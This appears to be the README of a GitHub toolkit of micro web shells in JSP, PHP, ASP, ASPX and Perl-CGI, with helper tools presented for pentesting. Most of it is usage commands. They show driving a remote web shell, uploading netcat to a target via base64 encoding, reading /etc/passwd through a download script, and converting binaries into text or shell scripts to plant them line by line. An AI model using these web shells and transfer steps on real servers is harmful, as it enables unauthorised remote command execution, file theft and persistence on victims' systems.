# uws (Micro Web Shells for Pentesting)

Micro web-shells for pentesting. 

## Features

* Minimalistic web-shell.
* Multiplatform.
* Source IP protection.

#### Shells 

* uws.jsp : java micro web shell, tested in linux/tomcat
* uws.php : php web shell, tested in linux/apache
* uws.asp : asp web shell, tested in winxp/iis
* uws.aspx : aspx web shell, tested in win2k3/iis
* uws.cgi : perl-cgi web shell, tested in linux/apache

#### Tools

* download.php, upload.php 
* binhex, hexbin 
* bin2sh
* wsh 

## Getting Started

These instructions will get you a copy of the project up and running on your local machine for development and testing purposes.

### Prerequisites

Binaries should compile/run on any Win32 or UNIX/Linux box. You only need a relatively modern C compiler.

### Installing

Download a copy of the project from github:

```
$ git clone https://github.com/joseigbv/uws.git
```

Compile tools.

```
$ gcc -Wall -O2 binhex.c -o binhex 
...
```

### Usage

Select web-shell and edit "REMOTEIP" to limit access.

It may be necessary to adapt the commands according to the target technology (linux or windows) (uuencode, uudecode, cmd, sh, cat, ...)

For Apache Tomcat build .WAR using genwar.sh 

#### Tools

wsh.sh: "client" for remote web shell with history

```
$ ./wsh.sh http://localhost:8080/uws.jsp

wsh> pwd
/opt/apache-tomcat-6.0.35/bin
wsh> 
```

upload_b64.sh: files upload using micro web shell and base64 encoding.

```
$ ./upload_b64.sh http://localhost:8080/uws.jsp /bin/nc /tmp/ncx

Uploading file...................................... done!
```

download_b64.sh: download files using micro web shell and base64 encoding.

```
$ ./download_b64.sh http://localhost:8080/hoolista/hoolista.jsp /bin/nc /tmp/nc
```

upload.php: text/binary files upload. 

```
$ curl -F file=@/bin/lss http://localhost/upload.php
```

download.php: text/binary files download.

```
$ curl http://localhost/download.php?file=/etc/passwd
```

binhex: converts binary file to text file with hexadecimal representation of bytes.

```
$ ./binhex < /bin/nc > nc.hex 
```

hexbin: convert text file with hexadecimal representation of bytes to binary file.

```
$ ./hexbin < nc.hex > /bin/nc 
```

bin2sh: converts binary to shell script, when executed it regenerates binary; useful to upload line by line.

```
$ ./bin2sh < /bin/nc > nc.sh 
$ ./nc.sh > /bin/nc
```

## Authors

* **José Ignacio Bravo** - *Initial work* - nacho.bravo@gmail.com

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details


